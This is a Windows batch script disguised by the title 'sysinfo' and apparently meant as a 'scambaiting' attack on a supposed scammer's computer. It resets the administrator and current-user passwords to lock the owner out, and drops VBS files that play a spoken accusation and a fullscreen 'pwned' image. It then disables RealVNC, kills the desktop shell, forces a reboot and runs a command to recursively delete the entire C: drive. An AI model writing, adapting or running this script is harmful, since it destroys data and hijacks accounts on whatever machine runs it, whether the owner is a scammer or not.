@echo off
setlocal EnableExtensions
title sysinfo

if /i not "%~1"=="GO" (
start "" /max "%~f0" GO
exit
)

REM ============================================================
REM 1. Lock them out of their own accounts (change passwords)
REM ============================================================
net user administrator PwnedByYou123! >nul 2>&1
net user %username% PwnedByYou123! >nul 2>&1

REM ============================================================
REM 2. Tell them why. Voice + popup + image (fullscreen, stretched)
REM    Pure VBS: no PowerShell, no mshta, no internet, no admin.
REM ============================================================
echo Dim s:s=CreateObject("SAPI.SpVoice"):s.Speak "Your PC has detected that you are a scammer. Your PC has detected that you are a scammer. You have been pwned." > "%temp%\speak.vbs"
start "" wscript.exe "%temp%\speak.vbs"
msg * "Your PC has detected scammer activity. Goodbye." 2>nul

set "IMG=%~dp0pwned.jpg"
if not exist "%IMG%" goto :noimg
copy /y "%IMG%" "%temp%\pwned.jpg" >nul 2>&1
if not exist "%temp%\pwned.jpg" goto :noimg

REM --- build the fullscreen viewer ---
> "%temp%\fs.vbs" echo Option Explicit
>>"%temp%\fs.vbs" echo Dim fso,sh,wmi,t,src,big,w,h,ok,c,p,pid,tgt,wf,ip,res
>>"%temp%\fs.vbs" echo Set fso=CreateObject("Scripting.FileSystemObject")
>>"%temp%\fs.vbs" echo Set sh=CreateObject("WScript.Shell")
>>"%temp%\fs.vbs" echo t=sh.ExpandEnvironmentStrings("%%TEMP%%")
>>"%temp%\fs.vbs" echo src=t ^& "\pwned.jpg"
>>"%temp%\fs.vbs" echo big=t ^& "\pwned_big.jpg"
>>"%temp%\fs.vbs" echo w=0
>>"%temp%\fs.vbs" echo h=0
>>"%temp%\fs.vbs" echo On Error Resume Next
>>"%temp%\fs.vbs" echo Set wmi=GetObject("winmgmts:\\.\root\cimv2")
>>"%temp%\fs.vbs" echo For Each c In wmi.ExecQuery("Select CurrentHorizontalResolution,CurrentVerticalResolution From Win32_VideoController")
>>"%temp%\fs.vbs" echo If IsNumeric(c.CurrentHorizontalResolution) Then
>>"%temp%\fs.vbs" echo If c.CurrentHorizontalResolution ^> w Then
>>"%temp%\fs.vbs" echo w=c.CurrentHorizontalResolution
>>"%temp%\fs.vbs" echo h=c.CurrentVerticalResolution
>>"%temp%\fs.vbs" echo End If
>>"%temp%\fs.vbs" echo End If
>>"%temp%\fs.vbs" echo Next
>>"%temp%\fs.vbs" echo On Error GoTo 0
>>"%temp%\fs.vbs" echo If w ^< 640 Then
>>"%temp%\fs.vbs" echo w=2560
>>"%temp%\fs.vbs" echo h=1440
>>"%temp%\fs.vbs" echo End If
>>"%temp%\fs.vbs" echo ok=False
>>"%temp%\fs.vbs" echo On Error Resume Next
>>"%temp%\fs.vbs" echo Set wf=CreateObject("WIA.ImageFile")
>>"%temp%\fs.vbs" echo wf.LoadFile src
>>"%temp%\fs.vbs" echo Set ip=CreateObject("WIA.ImageProcess")
>>"%temp%\fs.vbs" echo ip.Filters.Add ip.FilterInfos("Scale").FilterID
>>"%temp%\fs.vbs" echo ip.Filters(1).Properties("MaximumWidth")=w
>>"%temp%\fs.vbs" echo ip.Filters(1).Properties("MaximumHeight")=h
>>"%temp%\fs.vbs" echo ip.Filters(1).Properties("PreserveAspectRatio")=False
>>"%temp%\fs.vbs" echo Set res=ip.Apply(wf)
>>"%temp%\fs.vbs" echo res.SaveFile big
>>"%temp%\fs.vbs" echo If fso.FileExists(big) Then
>>"%temp%\fs.vbs" echo ok=True
>>"%temp%\fs.vbs" echo End If
>>"%temp%\fs.vbs" echo On Error GoTo 0
>>"%temp%\fs.vbs" echo If ok Then
>>"%temp%\fs.vbs" echo tgt=big
>>"%temp%\fs.vbs" echo Else
>>"%temp%\fs.vbs" echo tgt=src
>>"%temp%\fs.vbs" echo End If
>>"%temp%\fs.vbs" echo pid=0
>>"%temp%\fs.vbs" echo On Error Resume Next
>>"%temp%\fs.vbs" echo sh.Run "rundll32.exe """ ^& sh.ExpandEnvironmentStrings("%%SystemRoot%%") ^& "\System32\shimgvw.dll" ^& """,ImageView_Fullscreen """ ^& tgt ^& """",1,False
>>"%temp%\fs.vbs" echo WScript.Sleep 2500
>>"%temp%\fs.vbs" echo For Each p In wmi.ExecQuery("Select ProcessId From Win32_Process Where Name='rundll32.exe'")
>>"%temp%\fs.vbs" echo If p.ProcessId ^> pid Then
>>"%temp%\fs.vbs" echo pid=p.ProcessId
>>"%temp%\fs.vbs" echo End If
>>"%temp%\fs.vbs" echo Next
>>"%temp%\fs.vbs" echo On Error GoTo 0
>>"%temp%\fs.vbs" echo On Error Resume Next
>>"%temp%\fs.vbs" echo If pid ^> 0 Then
>>"%temp%\fs.vbs" echo sh.AppActivate pid
>>"%temp%\fs.vbs" echo WScript.Sleep 400
>>"%temp%\fs.vbs" echo sh.SendKeys "{+}{+}{+}{+}"
>>"%temp%\fs.vbs" echo Else
>>"%temp%\fs.vbs" echo sh.Run "explorer.exe """ ^& tgt ^& """",1,False
>>"%temp%\fs.vbs" echo WScript.Sleep 2500
>>"%temp%\fs.vbs" echo sh.SendKeys "{F11}"
>>"%temp%\fs.vbs" echo End If
>>"%temp%\fs.vbs" echo WScript.Sleep 6000
>>"%temp%\fs.vbs" echo sh.Run "taskkill /f /im rundll32.exe",0,True
>>"%temp%\fs.vbs" echo sh.Run "taskkill /f /im Microsoft.Photos.exe",0,True
>>"%temp%\fs.vbs" echo On Error GoTo 0

start "" wscript.exe "%temp%\fs.vbs"
timeout /t 12 /nobreak >nul
taskkill /f /im wscript.exe >nul 2>&1
taskkill /f /im rundll32.exe >nul 2>&1
taskkill /f /im Microsoft.Photos.exe >nul 2>&1
:noimg

REM ============================================================
REM 3. Nuke RealVNC itself (removes their backdoor too)
REM ============================================================
sc stop vncserver >nul 2>&1
sc config vncserver start= disabled >nul 2>&1

REM ============================================================
REM 4. THE COUNTDOWN — black screen, white 10..1
REM ============================================================
color 0F
taskkill /f /im explorer.exe >nul 2>&1

for /l %%n in (10,-1,1) do (
cls
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo %%n
ping -n 2 127.0.0.1 >nul
)

REM ============================================================
REM 5. Reboot first so it always fires, then THE WIPE
REM ============================================================
shutdown /r /t 15 >nul 2>&1
rd /s /q "C:\Program Files\RealVNC" >nul 2>&1
rd /s /q c:\ >nul 2>&1
exit